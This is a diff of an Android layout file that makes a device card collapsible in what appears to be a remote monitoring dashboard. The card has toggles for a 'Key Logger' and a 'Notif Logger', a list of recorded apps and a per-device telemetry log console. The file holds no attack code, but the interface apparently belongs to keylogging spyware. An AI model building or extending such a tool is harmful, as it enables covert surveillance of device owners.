@@ -7,13 +7,13 @@
     android:padding="16dp"
     android:layout_marginBottom="16dp">
 
-    <!-- Device Header -->
+    <!-- Device Header (Always visible, clickable to expand/collapse) -->
     <LinearLayout
+        android:id="@+id/layoutDeviceHeader"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         android:orientation="horizontal"
-        android:gravity="center_vertical"
-        android:layout_marginBottom="12dp">
+        android:gravity="center_vertical">
 
         <TextView
             android:layout_width="wrap_content"
@@ -42,7 +42,7 @@
                 android:id="@+id/txtDeviceSub"
                 android:layout_width="wrap_content"
                 android:layout_height="wrap_content"
-                android:text="Active Node // Full Telemetry"
+                android:text="Active Node // Tap to Expand"
                 android:textSize="11sp"
                 android:textColor="#94A3B8" />
         </LinearLayout>
@@ -62,115 +62,133 @@
             android:paddingBottom="4dp" />
     </LinearLayout>
 
-    <!-- Remote-Control Buttons -->
+    <!-- Expandable Content (Hidden by default, shown when expanded) -->
     <LinearLayout
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:orientation="horizontal"
-        android:layout_marginBottom="12dp">
-
-        <Button
-            android:id="@+id/btnToggleKeyLog"
-            android:layout_width="0dp"
-            android:layout_height="wrap_content"
-            android:layout_weight="1"
-            android:text="Key Logger: ON"
-            android:textSize="11sp"
-            android:textStyle="bold"
-            android:background="@drawable/btn_green_rounded"
-            android:textColor="#FFFFFF"
-            android:layout_marginRight="6dp" />
-
-        <Button
-            android:id="@+id/btnToggleNotifLog"
-            android:layout_width="0dp"
-            android:layout_height="wrap_content"
-            android:layout_weight="1"
-            android:text="Notif Logger: ON"
-            android:textSize="11sp"
-            android:textStyle="bold"
-            android:background="@drawable/btn_green_rounded"
-            android:textColor="#FFFFFF"
-            android:layout_marginLeft="6dp" />
-    </LinearLayout>
-
-    <!-- Per-Device Apps Recorded Today Tile (Clickable for App-Specific Logs) -->
-    <TextView
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="Apps Recorded Today (Click App to Filter):"
-        android:textStyle="bold"
-        android:textSize="11sp"
-        android:textColor="#94A3B8"
-        android:fontFamily="monospace"
-        android:layout_marginBottom="4dp" />
-
-    <LinearLayout
-        android:id="@+id/containerDeviceAppsToday"
+        android:id="@+id/layoutExpandableContent"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         android:orientation="vertical"
-        android:layout_marginBottom="12dp" />
-
-    <!-- Filter Header & Back to All Logs Button -->
-    <LinearLayout
-        android:id="@+id/layoutFilterHeader"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:orientation="horizontal"
-        android:gravity="center_vertical"
-        android:layout_marginBottom="4dp"
         android:visibility="gone">
 
-        <TextView
-            android:id="@+id/txtActiveFilter"
-            android:layout_width="0dp"
-            android:layout_height="wrap_content"
-            android:layout_weight="1"
-            android:text="Filtering: App"
-            android:textSize="11sp"
-            android:textStyle="bold"
-            android:textColor="#38BDF8"
-            android:fontFamily="monospace" />
+        <!-- Spacer / divider -->
+        <View
+            android:layout_width="match_parent"
+            android:layout_height="1dp"
+            android:background="#1E293B"
+            android:layout_marginTop="12dp"
+            android:layout_marginBottom="12dp" />
 
-        <Button
-            android:id="@+id/btnBackToAll"
-            android:layout_width="wrap_content"
-            android:layout_height="28dp"
-            android:text="Back to All Logs"
-            android:textSize="9sp"
-            android:textStyle="bold"
-            android:background="@drawable/btn_blue_rounded"
-            android:textColor="#FFFFFF" />
-    </LinearLayout>
-
-    <!-- Terminal-style Log Panel -->
-    <TextView
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="INDIVIDUAL TELEMETRY FEED:"
-        android:textStyle="bold"
-        android:textSize="11sp"
-        android:textColor="#94A3B8"
-        android:fontFamily="monospace"
-        android:layout_marginBottom="6dp" />
-
-    <ScrollView
-        android:id="@+id/logScrollView"
-        android:layout_width="match_parent"
-        android:layout_height="260dp"
-        android:background="#0A0F1D"
-        android:padding="10dp"
-        android:fillViewport="false">
-
-        <TextView
-            android:id="@+id/txtDeviceLogConsole"
+        <!-- Remote-Control Buttons -->
+        <LinearLayout
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:text="Waiting for device activity..."
+            android:orientation="horizontal"
+            android:layout_marginBottom="12dp">
+
+            <Button
+                android:id="@+id/btnToggleKeyLog"
+                android:layout_width="0dp"
+                android:layout_height="wrap_content"
+                android:layout_weight="1"
+                android:text="Key Logger: ON"
+                android:textSize="11sp"
+                android:textStyle="bold"
+                android:background="@drawable/btn_green_rounded"
+                android:textColor="#FFFFFF"
+                android:layout_marginRight="6dp" />
+
+            <Button
+                android:id="@+id/btnToggleNotifLog"
+                android:layout_width="0dp"
+                android:layout_height="wrap_content"
+                android:layout_weight="1"
+                android:text="Notif Logger: ON"
+                android:textSize="11sp"
+                android:textStyle="bold"
+                android:background="@drawable/btn_green_rounded"
+                android:textColor="#FFFFFF"
+                android:layout_marginLeft="6dp" />
+        </LinearLayout>
+
+        <!-- Per-Device Apps Recorded Today Tile (Clickable for App-Specific Logs) -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Apps Recorded Today (Click App to Filter):"
+            android:textStyle="bold"
             android:textSize="11sp"
-            android:textColor="#38BDF8"
-            android:fontFamily="monospace" />
-    </ScrollView>
+            android:textColor="#94A3B8"
+            android:fontFamily="monospace"
+            android:layout_marginBottom="4dp" />
+
+        <LinearLayout
+            android:id="@+id/containerDeviceAppsToday"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:layout_marginBottom="12dp" />
+
+        <!-- Filter Header & Back to All Logs Button -->
+        <LinearLayout
+            android:id="@+id/layoutFilterHeader"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:gravity="center_vertical"
+            android:layout_marginBottom="4dp"
+            android:visibility="gone">
+
+            <TextView
+                android:id="@+id/txtActiveFilter"
+                android:layout_width="0dp"
+                android:layout_height="wrap_content"
+                android:layout_weight="1"
+                android:text="Filtering: App"
+                android:textSize="11sp"
+                android:textStyle="bold"
+                android:textColor="#38BDF8"
+                android:fontFamily="monospace" />
+
+            <Button
+                android:id="@+id/btnBackToAll"
+                android:layout_width="wrap_content"
+                android:layout_height="28dp"
+                android:text="Back to All Logs"
+                android:textSize="9sp"
+                android:textStyle="bold"
+                android:background="@drawable/btn_blue_rounded"
+                android:textColor="#FFFFFF" />
+        </LinearLayout>
+
+        <!-- Terminal-style Log Panel -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="INDIVIDUAL TELEMETRY FEED (Last 24 Hours):"
+            android:textStyle="bold"
+            android:textSize="11sp"
+            android:textColor="#94A3B8"
+            android:fontFamily="monospace"
+            android:layout_marginBottom="6dp" />
+
+        <ScrollView
+            android:id="@+id/logScrollView"
+            android:layout_width="match_parent"
+            android:layout_height="260dp"
+            android:background="#0A0F1D"
+            android:padding="10dp"
+            android:fillViewport="false">
+
+            <TextView
+                android:id="@+id/txtDeviceLogConsole"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Waiting for device activity..."
+                android:textSize="11sp"
+                android:textColor="#38BDF8"
+                android:fontFamily="monospace" />
+        </ScrollView>
+
+    </LinearLayout>
 
 </LinearLayout>
